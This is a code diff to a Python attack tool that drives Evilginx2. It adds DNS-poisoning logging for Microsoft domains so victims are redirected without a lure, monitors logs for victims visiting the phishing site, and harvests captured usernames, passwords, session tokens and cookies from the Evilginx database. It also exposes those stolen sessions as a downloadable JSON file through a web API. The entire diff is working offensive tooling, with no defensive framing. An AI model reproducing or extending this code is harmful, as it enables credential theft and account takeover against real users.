@@ -575,7 +575,9 @@ class EvilginxManager:
         self.domains_to_poison = []
         self.sessions = []
         self.monitor_thread = None
+        self.log_monitor_thread = None
         self.stop_monitoring = False
+        self.log_file = '/tmp/evilginx.log'
 
     def check_installation(self):
         """Check if Evilginx2 is installed"""
@@ -738,10 +740,16 @@ phishlets enable {phishlet}
                 self.monitor_thread = threading.Thread(target=self._monitor_sessions, daemon=True)
                 self.monitor_thread.start()
                 
+                # Start log monitoring for real-time attack visibility
+                self.log_monitor_thread = threading.Thread(target=self._monitor_logs, daemon=True)
+                self.log_monitor_thread.start()
+                
                 log(f"Evilginx2 started (PID: {self.process.pid})", 'SUCCESS')
                 log(f"Phishlet: {phishlet}")
                 log(f"Primary domain: {domain}")
                 log(f"Bridge IP: {self.bridge_ip}")
+                log(f"Database: {self.db_path}")
+                log(f"Config dir: {self.config_dir}")
                 log(f"")
                 log(f"DNS POISONING ACTIVE:", 'SUCCESS')
                 log(f"  Intercepting DNS queries for:")
@@ -749,6 +757,9 @@ phishlets enable {phishlet}
                     log(f"    - {d} -> {self.bridge_ip}")
                 log(f"  Victim traffic automatically redirected to Evilginx")
                 log(f"  No lure needed - user visits Microsoft normally")
+                log(f"")
+                log(f"Session monitoring started - checking for captures every 5s")
+                log(f"Real-time activity monitoring enabled", 'SUCCESS')
                 return True
             else:
                 log("Evilginx2 failed to start - check logs", 'ERROR')
@@ -766,8 +777,9 @@ phishlets enable {phishlet}
         try:
             log("Setting up automatic DNS poisoning...")
             
-            # Create dnsmasq config for poisoning
+            # Create dnsmasq config for poisoning with query logging
             dnsmasq_conf = f"/tmp/evilginx-dnsmasq.conf"
+            dnsmasq_log = f"/tmp/evilginx-dnsmasq.log"
             
             with open(dnsmasq_conf, 'w') as f:
                 f.write(f"# Evilginx DNS Poisoning\n")
@@ -775,6 +787,8 @@ phishlets enable {phishlet}
                 f.write(f"bind-interfaces\n")
                 f.write(f"listen-address={self.bridge_ip}\n")
                 f.write(f"port=5353\n")  # Use non-standard port, redirect with iptables
+                f.write(f"log-queries\n")
+                f.write(f"log-facility={dnsmasq_log}\n")
                 f.write(f"\n")
                 
                 # Poison Microsoft domains
@@ -792,13 +806,16 @@ phishlets enable {phishlet}
             run_cmd(['pkill', '-f', 'dnsmasq.*evilginx'])
             time.sleep(1)
             
-            # Start dnsmasq
+            # Start dnsmasq with logging
             self.dnsmasq_process = subprocess.Popen(
-                ['dnsmasq', '-C', dnsmasq_conf, '--no-daemon'],
+                ['dnsmasq', '-C', dnsmasq_conf, '--no-daemon', '--log-queries'],
                 stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
                 preexec_fn=os.setpgrp
             )
+            
+            # Start DNS log monitor
+            threading.Thread(target=self._monitor_dns_logs, daemon=True).start()
             
             time.sleep(1)
             
@@ -886,47 +903,152 @@ phishlets enable {phishlet}
             log(f"Stop failed: {e}", 'ERROR')
             return False
 
+    def _monitor_dns_logs(self):
+        """Monitor DNS queries from dnsmasq in real-time"""
+        seen_queries = set()
+        
+        while not self.stop_monitoring and self.dnsmasq_process:
+            try:
+                if self.dnsmasq_process.stdout:
+                    line = self.dnsmasq_process.stdout.readline()
+                    if line:
+                        line = line.decode('utf-8', errors='ignore').strip()
+                        
+                        # Parse dnsmasq query logs
+                        if 'query' in line.lower():
+                            for domain in self.domains_to_poison:
+                                if domain in line:
+                                    # Extract client IP if possible
+                                    query_key = f"{domain}-{line[-20:]}"
+                                    if query_key not in seen_queries:
+                                        seen_queries.add(query_key)
+                                        log(f"VICTIM DNS QUERY: {domain}", 'INFO')
+                                        
+                                        # Keep set size manageable
+                                        if len(seen_queries) > 100:
+                                            seen_queries.clear()
+                                    break
+                else:
+                    time.sleep(0.5)
+                    
+            except Exception:
+                time.sleep(1)
+    
+    def _monitor_logs(self):
+        """Monitor Evilginx logs for real-time victim activity"""
+        seen_lines = set()
+        
+        while not self.stop_monitoring:
+            try:
+                if os.path.exists(self.log_file):
+                    with open(self.log_file, 'r') as f:
+                        lines = f.readlines()
+                        
+                        for line in lines:
+                            line_hash = hash(line)
+                            if line_hash not in seen_lines:
+                                seen_lines.add(line_hash)
+                                
+                                # Detect interesting events
+                                lower_line = line.lower()
+                                
+                                # HTTP/HTTPS connections to phishing domain
+                                if any(d in lower_line for d in self.domains_to_poison):
+                                    if 'request' in lower_line or 'GET' in line or 'POST' in line:
+                                        log(f"VICTIM VISITING PHISHING SITE", 'WARNING')
+                                
+                                # Authentication attempts
+                                if 'auth' in lower_line or 'login' in lower_line or 'signin' in lower_line:
+                                    log(f"AUTHENTICATION IN PROGRESS", 'WARNING')
+                                
+                                # Session capture
+                                if 'session' in lower_line and ('captured' in lower_line or 'saved' in lower_line):
+                                    log(f"SESSION CAPTURED!", 'SUCCESS')
+                                
+                                # Cookies/tokens
+                                if 'cookie' in lower_line or 'token' in lower_line:
+                                    if 'captured' in lower_line or 'saved' in lower_line:
+                                        log(f"CREDENTIALS EXTRACTED", 'SUCCESS')
+                                
+                                # Keep set size manageable
+                                if len(seen_lines) > 500:
+                                    seen_lines.clear()
+                
+                time.sleep(2)
+                
+            except Exception as e:
+                # Don't spam errors
+                time.sleep(5)
+    
     def _monitor_sessions(self):
         """Monitor Evilginx database for captured sessions"""
         while not self.stop_monitoring:
             try:
-                if os.path.exists(self.db_path):
-                    # Parse Evilginx database for sessions
-                    # Database is JSON-based
+                # Try multiple database locations
+                db_paths = [
+                    self.db_path,
+                    os.path.expanduser('~/.evilginx/data.db'),
+                    os.path.join(self.config_dir, 'data.db'),
+                    '/root/.evilginx/data.db'
+                ]
+                
+                db_found = None
+                for db in db_paths:
+                    if os.path.exists(db):
+                        db_found = db
+                        break
+                
+                if db_found:
                     try:
                         import sqlite3
-                        conn = sqlite3.connect(self.db_path)
+                        conn = sqlite3.connect(db_found, timeout=5)
                         cursor = conn.cursor()
                         
-                        # Get sessions
-                        cursor.execute("SELECT id, phishlet, username, password, tokens, cookies, create_time FROM sessions WHERE captured=1")
-                        rows = cursor.fetchall()
+                        # Check what tables exist
+                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+                        tables = [row[0] for row in cursor.fetchall()]
                         
-                        new_sessions = []
-                        for row in rows:
-                            session = {
-                                'id': row[0],
-                                'phishlet': row[1],
-                                'username': row[2],
-                                'password': row[3],
-                                'tokens': row[4],
-                                'cookies': row[5],
-                                'captured_at': row[6],
-                                'timestamp': datetime.now().isoformat()
-                            }
+                        if 'sessions' in tables:
+                            # Get all captured sessions
+                            cursor.execute("SELECT * FROM sessions")
+                            columns = [description[0] for description in cursor.description]
+                            rows = cursor.fetchall()
                             
-                            # Check if new
-                            if not any(s['id'] == session['id'] for s in self.sessions):
-                                new_sessions.append(session)
-                                log(f"🎣 New session captured! User: {session['username']}", 'SUCCESS')
-                        
-                        if new_sessions:
-                            self.sessions.extend(new_sessions)
-                            self._save_sessions()
+                            new_sessions = []
+                            for row in rows:
+                                # Build session dict from columns
+                                session_dict = dict(zip(columns, row))
+                                
+                                # Extract key fields
+                                session = {
+                                    'id': session_dict.get('id'),
+                                    'phishlet': session_dict.get('phishlet', 'unknown'),
+                                    'username': session_dict.get('username', ''),
+                                    'password': session_dict.get('password', ''),
+                                    'tokens': session_dict.get('tokens', ''),
+                                    'cookies': session_dict.get('custom', ''),  # cookies might be in 'custom' field
+                                    'captured_at': session_dict.get('update_time', ''),
+                                    'timestamp': datetime.now().isoformat(),
+                                    'raw': str(session_dict)
+                                }
+                                
+                                # Check if new
+                                if not any(s.get('id') == session['id'] for s in self.sessions):
+                                    new_sessions.append(session)
+                                    log(f"NEW SESSION CAPTURED! User: {session['username']}", 'SUCCESS')
+                            
+                            if new_sessions:
+                                self.sessions.extend(new_sessions)
+                                self._save_sessions()
+                        else:
+                            log(f"No sessions table in database. Tables: {tables}", 'WARNING')
                         
                         conn.close()
                     except Exception as e:
                         log(f"Session parsing error: {e}", 'ERROR')
+                else:
+                    # Database doesn't exist yet - this is normal before first capture
+                    pass
                 
                 time.sleep(5)
                 
@@ -1895,7 +2017,13 @@ class NACWebHandler(BaseHTTPRequestHandler):
             self._send_json({'success': success})
             
         elif path == '/api/evilginx/sessions':
-            self._send_json(self.bridge_manager.evilginx_manager.get_status())
+            # Export sessions as JSON file download
+            sessions = self.bridge_manager.evilginx_manager.sessions
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Disposition', 'attachment; filename="evilginx_sessions.json"')
+            self.end_headers()
+            self.wfile.write(json.dumps(sessions, indent=2).encode('utf-8'))
             
         elif path == '/api/evilginx/clear_sessions':
             self.bridge_manager.evilginx_manager.clear_sessions()
